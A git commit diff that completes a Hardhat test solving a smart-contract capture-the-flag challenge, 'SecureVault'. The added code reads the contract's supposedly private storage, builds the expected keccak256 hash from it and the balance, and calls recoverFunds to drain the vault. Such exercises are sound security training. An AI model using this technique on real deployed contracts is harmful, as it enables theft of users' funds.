9cc1ad4990df40e4990f060518f81ba395503475
Richa-iitr <richa@cs.iitr.ac.in>
2024-04-08 13:03:06 +0530

    n1

--- test/N1-SecureVault-easy.js
+++ test/N1-SecureVault-easy.js
@@ -1,4 +1,5 @@
 const { expect } = require('chai');
+const { ethers } = require('hardhat');
 
 // run the test
 // npx hardhat test ./test/N1-SecureVault-easy.js
@@ -14,8 +15,17 @@ describe('CTF #1 SecureVault', function () {
   });
 
   it('Should recover all funds', async function () {
-    // Your code goes here
-
+    let slot = await ethers.provider.getStorageAt(challengeInstance.address, 0);
+    slot = ethers.BigNumber.from(slot);
+    
+    let _balance = await ethers.provider.getBalance(challengeInstance.address);
+    _balance = ethers.BigNumber.from(_balance);
+    _balance = _balance.add(ethers.utils.parseEther('0.0001'));
+    
+    let hash = ethers.utils.solidityKeccak256(["uint256", "uint256"], [slot, _balance]);
+    
+    await challengeInstance.recoverFunds(hash, { value: ethers.utils.parseEther('0.0001') });
+    
     expect(await ethers.provider.getBalance(challengeInstance.address)).to.equal('0');
   });
 });
